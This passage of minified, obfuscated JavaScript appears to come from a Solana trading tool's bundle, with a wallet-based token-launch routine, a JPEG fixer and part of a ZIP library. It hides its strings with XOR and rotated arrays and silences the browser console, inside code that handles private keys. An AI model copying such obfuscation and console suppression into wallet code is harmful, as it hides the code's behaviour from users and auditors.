      const t = 432,
        e = 402,
        n = 422,
        r = 426,
        o = 375,
        i = 367,
        s = 366,
        a = WP,
        u = {
          pxNAV: function (t, e) {
            return t(e);
          },
          ujMaE: function (t, e) {
            return t + e;
          },
          vfWtV: function (t, e) {
            return t + e;
          },
          wwfKG: "return (function() ",
          ukxuQ: a(408),
          lurwg: "warn",
          tGRec: a(t),
          NvcSq: "exception",
          QibIe: "table",
          JOLmW: "trace",
        },
        c = (function () {
          const t = a;
          let e;
          try {
            e = u.pxNAV(
              Function,
              u[t(o)](
                u.vfWtV(u[t(i)], '{}.constructor("retu' + t(s) + " )"),
                ");"
              )
            )();
          } catch (n) {
            e = window;
          }
          return e;
        })(),
        l = (c.console = c.console || {}),
        d = [u.ukxuQ, u[a(e)], "info", u.tGRec, u.NvcSq, u[a(n)], u[a(r)]];
      for (let f = 0; f < d[a(380)]; f++) {
        const t = qP.constructor.prototype.bind(qP),
          e = d[f],
          n = l[e] || t;
        (t.__proto__ = qP.bind(qP)),
          (t.toString = n.toString.bind(n)),
          (l[e] = t);
      }
    });
  function KP() {
    const t = [
      "C3rYAw5NAwz5",
      "AxnvC2vYqxv0Aa",
      "AgH3sui",
      "z2v0uNbJug9VBa",
      "Bffqt24",
      "mZCXmZKWmenrDK5rvG",
      "zvvUAxrZ",
      "uxDRuvi",
      "uwLIswu",
      "z2TYCeC",
      "y3bTBq",
      "yw1VDw50",
      "sK9mBvC",
      "CM9Y",
      "zw50AwnHDgvK",
      "C3rYAw5N",
      "rMzzzwS1DKv6mG",
      "AgfZs2v5ugfPCG",
      "zxjYB3i",
      "mM9HnKvWAhn2wa",
      "sw5MBW",
      "C2TPCfbYzwzSAq",
      "icSGmc4WmIbttW",
      "z2v0uNbJq2XPzq",
      "zgf0yq",
      "sMz6r0m",
      "Dfbzrw0",
      "y29UBMvJDgLVBG",
      "BxnN",
      "mZG1z0nYD0z5",
      "vMPVuNa",
      "nda0nta4t2rOzufj",
      "C3vJy2vZCW",
      "ChjPB3jPDhLgzq",
      "z2v0u2v0DgLUzW",
      "Aw5PDgLHBeXPCq",
      "ignVAw4",
      "BMfTzq",
      "C2vSBfrVA2vU",
      "CM4GDgHPCYiPka",
      "D3DMs0C",
      "ywXHBMnL",
      "ntrqvwTIq1e",
      "mJK1otuYz2DhrfPP",
      "tNHVr0i",
      "y2HWywq",
      "B2HRr3a",
      "C2XPChbHz2u",
      "DwPnyuu",
      "BhKGy3jLyxrLza",
      "C3P5DNe",
      "mLfzB1ftsW",
      "z2v0vg9Rzw5byW",
      "BgvUz3rO",
      "y291BNrcywXHBG",
      "z2v0qwnJB3vUDa",
      "tK56zKW",
      "zxHKEwu",
      "DezrreK",
      "z2v0sw5ZDgfUyW",
      "z2v0qMfSyw5Jzq",
      "Bgf1BMnOCgfK",
      "sLLxsw4",
      "BwvZC2fNzq",
      "ndaXmZi1mLPyqvHHta",
      "odi1mtyWAvvZz21h",
      "DxjP",
      "Cg9VBeLK",
      "yNf6zMi",
      "u0HPu2O",
      "t0HMs2u",
      "odK5odC5yKXsBfzP",
      "C29Sqw1VDw50vq",
      "m2POBeXtBG",
      "ChvIBgLJs2v5",
      "BhvYD2C",
      "vw5RBM93BIbLCG",
      "Agn6zwC",
      "z2v0q29UBMvJDa",
      "mtCXyuTzuKPH",
      "B2LtDg4",
      "Bg9N",
      "B3joqKC",
      "nJGWnZaXuMHmwhfd",
      "u3vJy2vZC2z1Ba",
      "z2H0",
      "zgvJB2rL",
    ];
    return (KP = function () {
      return t;
    })();
  }
  function WP(t, e) {
    const n = KP();
    return (
      (WP = function (e, r) {
        let o = n[(e -= 362)];
        if (void 0 === WP.KnCVgm) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (WP.agxItL = i), (t = arguments), (WP.KnCVgm = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.RoZGCZ = t),
              (this.tnCYqF = [1, 0, 0]),
              (this.SXYLkq = function () {
                return "newState";
              }),
              (this.vHKYnr = "\\w+ *\\(\\) *{\\w+ *"),
              (this.ErUAam = "['|\"].+['|\"];? *}");
          };
          (e.prototype.dNenOz = function () {
            const t = new RegExp(this.vHKYnr + this.ErUAam).test(
              this.SXYLkq.toString()
            )
              ? --this.tnCYqF[1]
              : --this.tnCYqF[0];
            return this.VbzthT(t);
          }),
            (e.prototype.VbzthT = function (t) {
              return Boolean(~t) ? this.AViOwb(this.RoZGCZ) : t;
            }),
            (e.prototype.AViOwb = function (t) {
              for (let e = 0, n = this.tnCYqF.length; e < n; e++)
                this.tnCYqF.push(Math.round(Math.random())),
                  (n = this.tnCYqF.length);
              return t(this.tnCYqF[0]);
            }),
            new e(WP).dNenOz(),
            (o = WP.agxItL(o)),
            (t[s] = o);
        }
        return o;
      }),
      WP(t, e)
    );
  }
  zP(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const FP = {
      priorityFeeUnits: new Yn(1e7),
      solAmountUnits: new Yn(0),
      slippage: 25,
    },
    jP = U_,
    GP = (function (t, e, n, r) {
      return f_([Hx, e.toBuffer(), eP(n), aC(r)], t);
    })(jP, xc, 0, 0)[NP(401)];
  let VP;
  const HP = async (t, e) => {
    var n, r;
    const o = 396,
      i = 395,
      s = 409,
      a = 440,
      u = 439,
      c = 429,
      l = 448,
      d = 447,
      f = 420,
      h = 399,
      p = 368,
      m = 421,
      g = 442,
      y = 438,
      w = 364,
      b = 424,
      v = 393,
      A = 430,
      k = 433,
      I = 374,
      S = 401,
      _ = 412,
      T = 376,
      B = 363,
      C = 446,
      E = 439,
      x = 380,
      P = 418,
      O = 373,
      R = 385,
      M = 380,
      L = 383,
      N = 416,
      D = 380,
      U = 413,
      q = 380,
      z = NP,
      K = {
        BucZu: function (t, e) {
          return t & e;
        },
      };
    (K[z(383)] = function (t, e) {
      return t >>> e;
    }),
      (K.ZvTiE = function (t, e) {
        return t * e;
      }),
      (K.verrV = function (t, e) {
        return t % e;
      }),
      (K.JJupd = function (t, e) {
        return t < e;
      }),
      (K.gkrpG = function (t, e) {
        return t & e;
      }),
      (K.ansfZ = function (t, e) {
        return t ^ e;
      }),
      (K.oiStn = function (t, e) {
        return t * e;
      }),
      (K[z(o)] = function (t, e) {
        return t * e;
      }),
      (K.hhwIB = function (t, e) {
        return t % e;
      }),
      (K.jzrOM = function (t, e) {
        return t * e;
      }),
      (K.Pfvhg = function (t, e) {
        return t < e;
      }),
      (K[z(i)] = function (t, e) {
        return t > e;
      }),
      (K[z(s)] = function (t, e) {
        return t === e;
      }),
      (K[z(a)] = function (t, e) {
        return t < e;
      }),
      (K.QwkQR = function (t, e) {
        return t + e;
      }),
      (K.ztUpN = function (t, e) {
        return t * e;
      }),
      (K[z(u)] = "Failed to create token"),
      (K.JUqig = z(c)),
      (K.hnpmX = "object");
    const W = K;
    try {
      if (e)
        return {
          msg: (function () {
            const t = 380,
              e = 413;
            let n;
            return function () {
              const r = WP;
              if (!n) {
                const o = new Uint8Array([
                    140, 50, 172, 115, 168, 103, 164, 98, 177, 43, 175, 126,
                    225, 48, 169, 107, 173, 103, 162, 98, 225, 36, 175, 106,
                    168, 41, 167, 39, 178, 40, 175, 105, 224,
                  ]),
                  i = 130041793,
                  s = new Uint8Array(o[r(t)]);
                for (let t = 0; t < o.length; t++) {
                  const e = (i >>> ((t % 4) * 8)) & 255;
                  s[t] = o[t] ^ e;
                }
                n = new TextDecoder()[r(e)](s);
              }
              return n;
            };
          })()(),
          success: ![],
        };
      const o = Yg.getInstance();
      if (!o.isUserAuthenticated())
        return {
          msg: (function () {
            let t;
            return function () {
              const e = WP;
              if (!t) {
                const n = new Uint8Array([
                    150, 52, 165, 117, 227, 41, 175, 115, 227, 38, 181, 115,
                    171, 34, 174, 115, 170, 36, 161, 115, 166, 35,
                  ]),
                  r = 130041795,
                  o = new Uint8Array(n.length);
                for (let t = 0; t < n[e(q)]; t++) {
                  const e = W.BucZu(W.NNzfL(r, W.ZvTiE(W.verrV(t, 4), 8)), 255);
                  o[t] = n[t] ^ e;
                }
                t = new TextDecoder()[e(413)](o);
              }
              return t;
            };
          })()(),
          success: ![],
        };
      const i = $g.getInstance(),
        s = i.getWallet();
      if (!s)
        return {
          msg: (function () {
            const t = 423;
            let e;
            return function () {
              const n = WP;
              if (!e) {
                const r = new Uint8Array([
                    143, 40, 224, 112, 160, 43, 172, 98, 181, 103, 164, 98, 181,
                    34, 163, 115, 164, 35,
                  ]),
                  o = 130041793,
                  i = new Uint8Array(r.length);
                for (let e = 0; W.JJupd(e, r.length); e++) {
                  const s = W[n(t)](o >>> ((e % 4) * 8), 255);
                  i[e] = W.ansfZ(r[e], s);
                }
                e = new TextDecoder().decode(i);
              }
              return e;
            };
          })()(),
          success: ![],
        };
      const a = Qg[z(386) + "e"]()[z(l) + "s"]();
      if (
        (a &&
          ((FP[z(d) + z(f)] = tR(a.priorityFee)), (FP.slippage = a.slippage)),
        (FP.solAmountUnits = W.bqzfb(parseFloat(t.initialLiquidity), 0)
          ? new Yn(Math.floor(1e9 * parseFloat(t[z(362) + "uidity"])))
          : new Yn(0)),
        W.orNBG(FP[z(h) + "nits"], 0))
      )
        return {
          msg: (function () {
            const t = 380,
              e = 371,
              n = 413,
              r = z,
              o = {};
            o[r(371)] = function (t, e) {
              return t ^ e;
            };
            const i = o;
            let s;
            return function () {
              const o = r;
              if (!s) {
                const r = new Uint8Array([
                    133, 40, 174, 108, 231, 35, 175, 98, 180, 103, 174, 104,
                    179, 103, 161, 107, 171, 40, 183, 39, 164, 53, 165, 102,
                    179, 46, 174, 96, 231, 119, 224, 84, 136, 11, 224, 100, 168,
                    46, 174, 116,
                  ]),
                  a = 130041799,
                  u = new Uint8Array(r.length);
                for (let n = 0; n < r[o(t)]; n++) {
                  const t = (a >>> ((n % 4) * 8)) & 255;
                  u[n] = i[o(e)](r[n], t);
                }
                s = new TextDecoder()[o(n)](u);
              }
              return s;
            };
          })()(),
          success: ![],
        };
      const u = await (null == (n = Lg.getRpcClient())
        ? void 0
        : n["getCachedB" + z(p)](s[z(401)]));
      if (
        !u ||
        W.tPYEm(
          u,
          W[z(m)](
            parseFloat(t.initialLiquidity) +
              (null == a ? void 0 : a.priorityFee),
            0.018
          )
        )
      ) {
        const e = {};
        return (
          (e[z(g)] =
            "Insufficient balance. You need to have " +
            t.initialLiquidity +
            z(436) +
            "L"),
          (e[z(446)] = ![]),
          e
        );
      }
      if (((VP = await LP(s, o.getConnection())), !VP))
        return {
          msg: (function () {
            const t = 407,
              e = function (e, n) {
                return W[WP(t)](e, n);
              };
            let n;
            return function () {
              const t = WP;
              if (!n) {
                const r = new Uint8Array([
                    135, 38, 169, 107, 164, 35, 224, 115, 174, 103, 169, 105,
                    168, 51, 169, 102, 173, 46, 186, 98, 225, 21, 161, 126, 165,
                    46, 181, 106, 224,
                  ]),
                  o = 130041793,
                  i = new Uint8Array(r.length);
                for (let n = 0; n < r[t(D)]; n++) {
                  const t = (o >>> e(n % 4, 8)) & 255;
                  i[n] = r[n] ^ t;
                }
                n = new TextDecoder()[t(U)](i);
              }
              return n;
            };
          })()(),
          success: ![],
        };
      const c = await VP.connection["getAccount" + z(434)](GP);
      if (!c)
        return {
          msg: (function () {
            let t;
            return function () {
              const e = WP;
              if (!t) {
                const n = new Uint8Array([
                    143, 38, 181, 105, 160, 47, 176, 102, 167, 103, 163, 104,
                    173, 33, 169, 96, 227, 41, 175, 115, 227, 33, 175, 114, 173,
                    35,
                  ]),
                  r = 130041795,
                  o = new Uint8Array(n.length);
                for (let t = 0; t < n[e(M)]; t++) {
                  const i = 255 & W[e(L)](r, W.SHiSj(W[e(N)](t, 4), 8));
                  o[t] = n[t] ^ i;
                }
                t = new TextDecoder()[e(413)](o);
              }
              return t;
            };
          })()(),
          success: ![],
        };
      const K = pP.decode(c[z(y)]);
      await i.getVanity(
        (function () {
          let t;
          return function () {
            if (!t) {
              const e = new Uint8Array([163, 40, 174, 108]),
                n = 130041793,
                r = new Uint8Array(e.length);
              for (let t = 0; t < e.length; t++) {
                const o = (n >>> W.jzrOM(t % 4, 8)) & 255;
                r[t] = e[t] ^ o;
              }
              t = new TextDecoder().decode(r);
            }
            return t;
          };
        })()()
      );
      let F = i.getKeyPair();
      const j = await JO(
          t,
          (function () {
            const t = {
              jaPvP: function (t, e) {
                return W.Pfvhg(t, e);
              },
              lQPOn: function (t, e) {
                return t & e;
              },
              ohkGp: function (t, e) {
                return t >>> e;
              },
              tFQDI: function (t, e) {
                return t ^ e;
              },
            };
            let e;
            return function () {
              const n = WP;
              if (!e) {
                const r = new Uint8Array([173, 40, 174, 108]),
                  o = 130041807,
                  i = new Uint8Array(r[n(x)]);
                for (let e = 0; t.jaPvP(e, r.length); e++) {
                  const s = t[n(P)](t[n(O)](o, (e % 4) * 8), 255);
                  i[e] = t[n(R)](r[e], s);
                }
                e = new TextDecoder().decode(i);
              }
              return e;
            };
          })()()
        ),
        G = ![],
        V = {
          programId: jP,
          mintA: F.publicKey,
          decimals: 6,
          name: j[z(w)],
          symbol: j.ticker,
          migrateType: z(b),
          uri: j[z(v)],
          platformId: new Ji(z(A) + "3cMkWsdJwG" + z(k) + "SHrGpdALN4g6W1"),
          configId: GP,
          configInfo: K,
          mintBDecimals: 9,
          txVersion: fS.V0,
          slippage: new Yn(W.ztUpN(FP[z(I)], 100)),
          buyAmount: FP.solAmountUnits,
          createOnly: G,
          extraSigners: [F],
          supply: new Yn(1e15),
          totalSellA: new Yn(7931e11),
          feePayer: s[z(S)],
        },
        { execute: H } = await VP.launchpad["createLaun" + z(372)](V),
        Z = { sequentially: !![] };
      Z["skipPrefli" + z(_)] = !![];
      const X = await H(Z),
        J = X && "undefined" !== X.txIds[0] && void 0 !== X;
      if (
        (await (null == (r = Lg.getRpcClient())
          ? void 0
          : r[z(387)](s.publicKey)),
        J)
      ) {
        const t = {};
        return (t.msg = "Successful" + z(T) + z(B)), (t[z(C)] = !![]), t;
      }
      const Y = {};
      return (Y.msg = W[z(E)]), (Y.success = ![]), Y;
    } catch (F) {
      let t = "Unknown error";
      F instanceof Error
        ? (t = F.message)
        : W[z(409)](typeof F, W.JUqig)
        ? (t = F)
        : F && typeof F === W.hnpmX && (t = JSON[z(414)](F));
      const e = {};
      return (e[z(g)] = "" + t), (e.success = ![]), e;
    }
  };
  function ZP(t, e) {
    const n = YP();
    return (
      (ZP = function (e, r) {
        let o = n[(e -= 481)];
        if (void 0 === ZP.kXYJYW) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (ZP.QfqTPR = i), (t = arguments), (ZP.kXYJYW = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.QdNlUU = t),
              (this.fBJDsg = [1, 0, 0]),
              (this.IOGKGZ = function () {
                return "newState";
              }),
              (this.ELpvjn = "\\w+ *\\(\\) *{\\w+ *"),
              (this.yhCgju = "['|\"].+['|\"];? *}");
          };
          (e.prototype.tqjeKq = function () {
            const t = new RegExp(this.ELpvjn + this.yhCgju).test(
              this.IOGKGZ.toString()
            )
              ? --this.fBJDsg[1]
              : --this.fBJDsg[0];
            return this.kWhCmA(t);
          }),
            (e.prototype.kWhCmA = function (t) {
              return Boolean(~t) ? this.qNlccS(this.QdNlUU) : t;
            }),
            (e.prototype.qNlccS = function (t) {
              for (let e = 0, n = this.fBJDsg.length; e < n; e++)
                this.fBJDsg.push(Math.round(Math.random())),
                  (n = this.fBJDsg.length);
              return t(this.fBJDsg[0]);
            }),
            new e(ZP).tqjeKq(),
            (o = ZP.QfqTPR(o)),
            (t[s] = o);
        }
        return o;
      }),
      ZP(t, e)
    );
  }
  axiomVamp,
    (function (t) {
      const e = 506,
        n = 483,
        r = 494,
        o = 502,
        i = 505,
        s = 488,
        a = 497,
        u = 496,
        c = 504,
        l = 484,
        d = ZP,
        f = t();
      for (; []; )
        try {
          if (
            900389 ===
            -parseInt(d(e)) / 1 +
              parseInt(d(n)) / 2 +
              (parseInt(d(r)) / 3) * (-parseInt(d(o)) / 4) +
              (parseInt(d(i)) / 5) * (-parseInt(d(s)) / 6) +
              (parseInt(d(a)) / 7) * (-parseInt(d(u)) / 8) +
              -parseInt(d(c)) / 9 +
              parseInt(d(l)) / 10
          )
            break;
          f.push(f.shift());
        } catch (h) {
          f.push(f.shift());
        }
    })(YP);
  const XP = (function () {
      const t = 481;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[ZP(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    JP = XP(void 0, function () {
      const t = ZP,
        e = { hFKEc: "(((.+)+)+)+$" },
        n = e;
      return JP[t(495)]()
        .search(n.hFKEc)
        [t(495)]()
        .constructor(JP)
        .search(n[t(498)]);
    });
  function YP() {
    const t = [
      "x19WCM90B19F",
      "mZyYndC4q0nZwePZ",
      "yMXVyG",
      "CMv0DxjUicHMDq",
      "y3rVCIGICMv0Dq",
      "A3HRzLK",
      "DhjHy2u",
      "mZm5mtCZn054tMLrDa",
      "Dg9tDhjPBMC",
      "mta4mZu3nJHTBLnnC3m",
      "n3PZzfPwvG",
      "Aezlrwm",
      "Aw5MBW",
      "qLHJqxe",
      "BgvUz3rO",
      "neHOqxfJrG",
      "ChjVDg90ExbL",
      "odi1ndi3ofjvChz6Bq",
      "mtvsCKv1B04",
      "mtu3odK1mgLbyxH4yG",
      "yxbWBhK",
      "D2fYBG",
      "mtm2nJy2mM9vALbABW",
      "ntm3otqZotbtqvrtzee",
      "wvLUs3y",
      "y29UC29Szq",
    ];
    return (YP = function () {
      return t;
    })();
  }
  JP();
  const QP = (function () {
      let t = !![];
      return function (e, n) {
        const r = 481,
          o = t
            ? function () {
                if (n) {
                  const t = n[ZP(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    $P = QP(void 0, function () {
      const t = 485,
        e = 491,
        n = 486,
        r = 493,
        o = 501,
        i = 503,
        s = 487,
        a = 495,
        u = ZP,
        c = {};
      (c[u(500)] = function (t, e) {
        return t + e;
      }),
        (c.kxkfY = u(490) + "nction() "),
        (c[u(t)] = "{}.constru" + u(e) + 'rn this")( )'),
        (c.zSDrL = function (t, e) {
          return t < e;
        });
      const l = c;
      let d;
      try {
        d = Function(l.BXcAq(l[u(492)], l.YYnKv) + ");")();
      } catch (p) {
        d = window;
      }
      const f = (d.console = d[u(n)] || {}),
        h = ["log", u(482), u(499), "error", "exception", "table", u(r)];
      for (let m = 0; l.zSDrL(m, h[u(o)]); m++) {
        const t = QP.constructor[u(i)].bind(QP),
          e = h[m],
          n = f[e] || t;
        (t[u(s)] = QP.bind(QP)), (t[u(a)] = n.toString.bind(n)), (f[e] = t);
      }
    });
  $P(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const tO = async (t) => {
    const e = ZP,
      n = await [
        function (t, e) {
          return t(e);
        },
      ][0](fetch, t);
    return await n[e([489][0])]();
  };
  function eO(t, e) {
    return new Promise(function (n, r) {
      let o;
      return nO(t).then(function (t) {
        try {
          return (
            (o = t),
            n(new Blob([e.slice(0, 2), o, e.slice(2)], { type: "image/jpeg" }))
          );
        } catch (i) {
          return r(i);
        }
      }, r);
    });
  }
  axiomVamp;
  const nO = (t) =>
    new Promise((e, n) => {
      const r = new FileReader();
      r.addEventListener("load", ({ target: { result: t } }) => {
        const r = new DataView(t);
        let o = 0;
        if (65496 !== r.getUint16(o)) return n("not a valid JPEG");
        for (o += 2; ; ) {
          const i = r.getUint16(o);
          if (65498 === i) break;
          const s = r.getUint16(o + 2);
          if (65505 === i && 1165519206 === r.getUint32(o + 4)) {
            const i = o + 10;
            let a;
            switch (r.getUint16(i)) {
              case 18761:
                a = !0;
                break;
              case 19789:
                a = !1;
                break;
              default:
                return n("TIFF header contains invalid endian");
            }
            if (42 !== r.getUint16(i + 2, a))
              return n("TIFF header contains invalid version");
            const u = r.getUint32(i + 4, a),
              c = i + u + 2 + 12 * r.getUint16(i + u, a);
            for (let t = i + u + 2; t < c; t += 12)
              if (274 == r.getUint16(t, a)) {
                if (3 !== r.getUint16(t + 2, a))
                  return n("Orientation data type is invalid");
                if (1 !== r.getUint32(t + 4, a))
                  return n("Orientation data count is invalid");
                r.setUint16(t + 8, 1, a);
                break;
              }
            return e(t.slice(o, o + 2 + s));
          }
          o += 2 + s;
        }
        return e(new Blob());
      }),
        r.readAsArrayBuffer(t);
    });
  var rO = {},
    oO = {
      get exports() {
        return rO;
      },
      set exports(t) {
        rO = t;
      },
    };
  !(function () {
    var t,
      e,
      n = {};
    (oO.exports = n),
      (n.parse = function (t, e) {
        for (
          var r = n.bin.readUshort,
            o = n.bin.readUint,
            i = 0,
            s = {},
            a = new Uint8Array(t),
            u = a.length - 4;
          101010256 != o(a, u);

        )
          u--;
        (i = u), (i += 4);
        var c = r(a, (i += 4));
        r(a, (i += 2));
        var l = o(a, (i += 2)),
          d = o(a, (i += 4));
        (i += 4), (i = d);
        for (var f = 0; f < c; f++) {
          o(a, i),
            (i += 4),
            (i += 4),
            (i += 4),
            o(a, (i += 4)),
            (l = o(a, (i += 4)));
          var h = o(a, (i += 4)),
            p = r(a, (i += 4)),
            m = r(a, i + 2),
            g = r(a, i + 4);
          i += 6;
          var y = o(a, (i += 8));
          (i += 4), (i += p + m + g), n._readLocal(a, y, s, l, h, e);
        }
        return s;
      }),
      (n._readLocal = function (t, e, r, o, i, s) {
        var a = n.bin.readUshort,
          u = n.bin.readUint;
        u(t, e), a(t, (e += 4)), a(t, (e += 2));
        var c = a(t, (e += 2));
        u(t, (e += 2)), u(t, (e += 4)), (e += 4);
        var l = a(t, (e += 8)),
          d = a(t, (e += 2));
        e += 2;
        var f = n.bin.readUTF8(t, e, l);
        if (((e += l), (e += d), s)) r[f] = { size: i, csize: o };
        else {
          var h = new Uint8Array(t.buffer, e);
          if (0 == c) r[f] = new Uint8Array(h.buffer.slice(e, e + o));
          else {
            if (8 != c) throw "unknown compression method: " + c;
            var p = new Uint8Array(i);
            n.inflateRaw(h, p), (r[f] = p);
          }
        }
      }),
      (n.inflateRaw = function (t, e) {
        return n.F.inflate(t, e);
      }),
      (n.inflate = function (t, e) {
        return (
          t[0],
          t[1],
          n.inflateRaw(
            new Uint8Array(t.buffer, t.byteOffset + 2, t.length - 6),
            e
          )
        );
      }),
      (n.deflate = function (t, e) {
        null == e && (e = { level: 6 });
        var r = 0,
          o = new Uint8Array(50 + Math.floor(1.1 * t.length));
        (o[r] = 120),
          (o[r + 1] = 156),
          (r += 2),
          (r = n.F.deflateRaw(t, o, r, e.level));
        var i = n.adler(t, 0, t.length);
        return (
          (o[r + 0] = (i >>> 24) & 255),
          (o[r + 1] = (i >>> 16) & 255),
          (o[r + 2] = (i >>> 8) & 255),
          (o[r + 3] = (i >>> 0) & 255),
          new Uint8Array(o.buffer, 0, r + 4)
        );
      }),
      (n.deflateRaw = function (t, e) {
        null == e && (e = { level: 6 });
        var r = new Uint8Array(50 + Math.floor(1.1 * t.length)),
          o = n.F.deflateRaw(t, r, o, e.level);
        return new Uint8Array(r.buffer, 0, o);
      }),
      (n.encode = function (t, e) {
        null == e && (e = !1);
        var r = 0,
          o = n.bin.writeUint,
          i = n.bin.writeUshort,
          s = {};
        for (var a in t) {
          var u = !n._noNeed(a) && !e,
            c = t[a],
            l = n.crc.crc(c, 0, c.length);
          s[a] = {
            cpr: u,
            usize: c.length,
            crc: l,
            file: u ? n.deflateRaw(c) : c,
          };
        }
        for (var a in s)
          r += s[a].file.length + 30 + 46 + 2 * n.bin.sizeUTF8(a);
        r += 22;
        var d = new Uint8Array(r),
          f = 0,
          h = [];
        for (var a in s) {
          var p = s[a];
          h.push(f), (f = n._writeHeader(d, f, a, p, 0));
        }
        var m = 0,
          g = f;
        for (var a in s)
          (p = s[a]), h.push(f), (f = n._writeHeader(d, f, a, p, 1, h[m++]));
        var y = f - g;
        return (
          o(d, f, 101010256),
          (f += 4),
          i(d, (f += 4), m),
          i(d, (f += 2), m),
          o(d, (f += 2), y),
          o(d, (f += 4), g),
          (f += 4),
          (f += 2),
          d.buffer
        );
      }),
      (n._noNeed = function (t) {
        var e = t.split(".").pop().toLowerCase();
        return -1 != "png,jpg,jpeg,zip".indexOf(e);
      }),
      (n._writeHeader = function (t, e, r, o, i, s) {
        var a = n.bin.writeUint,
          u = n.bin.writeUshort,
          c = o.file;
        return (
          a(t, e, 0 == i ? 67324752 : 33639248),
          (e += 4),
          1 == i && (e += 2),
          u(t, e, 20),
          u(t, (e += 2), 0),
          u(t, (e += 2), o.cpr ? 8 : 0),
          a(t, (e += 2), 0),
          a(t, (e += 4), o.crc),
          a(t, (e += 4), c.length),
          a(t, (e += 4), o.usize),
          u(t, (e += 4), n.bin.sizeUTF8(r)),
          u(t, (e += 2), 0),
          (e += 2),
          1 == i && ((e += 2), (e += 2), a(t, (e += 6), s), (e += 4)),
          (e += n.bin.writeUTF8(t, e, r)),
          0 == i && (t.set(c, e), (e += c.length)),
          e
        );
      }),
      (n.crc = {
        table: (function () {
          for (var t = new Uint32Array(256), e = 0; e < 256; e++) {
            for (var n = e, r = 0; r < 8; r++)
              1 & n ? (n = 3988292384 ^ (n >>> 1)) : (n >>>= 1);
            t[e] = n;
          }
          return t;
        })(),
        update: function (t, e, r, o) {
          for (var i = 0; i < o; i++)
            t = n.crc.table[255 & (t ^ e[r + i])] ^ (t >>> 8);
          return t;
        },
        crc: function (t, e, r) {
          return 4294967295 ^ n.crc.update(4294967295, t, e, r);
        },
      }),
      (n.adler = function (t, e, n) {
        for (var r = 1, o = 0, i = e, s = e + n; i < s; ) {
          for (var a = Math.min(i + 5552, s); i < a; ) o += r += t[i++];
          (r %= 65521), (o %= 65521);
        }
        return (o << 16) | r;
      }),
      (n.bin = {
        readUshort: function (t, e) {
          return t[e] | (t[e + 1] << 8);
        },
        writeUshort: function (t, e, n) {
          (t[e] = 255 & n), (t[e + 1] = (n >> 8) & 255);
        },
        readUint: function (t, e) {
          return (
            16777216 * t[e + 3] + ((t[e + 2] << 16) | (t[e + 1] << 8) | t[e])
          );
        },
        writeUint: function (t, e, n) {
          (t[e] = 255 & n),
            (t[e + 1] = (n >> 8) & 255),
            (t[e + 2] = (n >> 16) & 255),
            (t[e + 3] = (n >> 24) & 255);
        },
        readASCII: function (t, e, n) {
          for (var r = "", o = 0; o < n; o++)
            r += String.fromCharCode(t[e + o]);
          return r;
        },
        writeASCII: function (t, e, n) {
          for (var r = 0; r < n.length; r++) t[e + r] = n.charCodeAt(r);
        },
        pad: function (t) {
          return t.length < 2 ? "0" + t : t;
        },
        readUTF8: function (t, e, r) {
          for (var o, i = "", s = 0; s < r; s++)
            i += "%" + n.bin.pad(t[e + s].toString(16));
          try {
            o = decodeURIComponent(i);
          } catch (a) {
            return n.bin.readASCII(t, e, r);
          }
          return o;
        },
        writeUTF8: function (t, e, n) {
          for (var r = n.length, o = 0, i = 0; i < r; i++) {
            var s = n.charCodeAt(i);
            if (4294967168 & s)
              if (4294965248 & s)
                if (4294901760 & s) {
                  if (4292870144 & s) throw "e";
                  (t[e + o] = 240 | (s >> 18)),
                    (t[e + o + 1] = 128 | ((s >> 12) & 63)),
                    (t[e + o + 2] = 128 | ((s >> 6) & 63)),
                    (t[e + o + 3] = 128 | (63 & s)),
                    (o += 4);
                } else
                  (t[e + o] = 224 | (s >> 12)),
                    (t[e + o + 1] = 128 | ((s >> 6) & 63)),
                    (t[e + o + 2] = 128 | (63 & s)),
                    (o += 3);
              else
                (t[e + o] = 192 | (s >> 6)),
                  (t[e + o + 1] = 128 | (63 & s)),
                  (o += 2);
            else (t[e + o] = s), o++;
          }
          return o;
        },
        sizeUTF8: function (t) {
          for (var e = t.length, n = 0, r = 0; r < e; r++) {
            var o = t.charCodeAt(r);
            if (4294967168 & o)
              if (4294965248 & o)
                if (4294901760 & o) {
                  if (4292870144 & o) throw "e";
                  n += 4;
                } else n += 3;
              else n += 2;
            else n++;
          }
          return n;
        },
      }),
      (n.F = {}),
      (n.F.deflateRaw = function (t, e, r, o) {
        var i = [
            [0, 0, 0, 0, 0],
            [4, 4, 8, 4, 0],
            [4, 5, 16, 8, 0],
            [4, 6, 16, 16, 0],
            [4, 10, 16, 32, 0],
            [8, 16, 32, 32, 0],
            [8, 16, 128, 128, 0],
            [8, 32, 128, 256, 0],
            [32, 128, 258, 1024, 1],
            [32, 258, 258, 4096, 1],
          ][o],
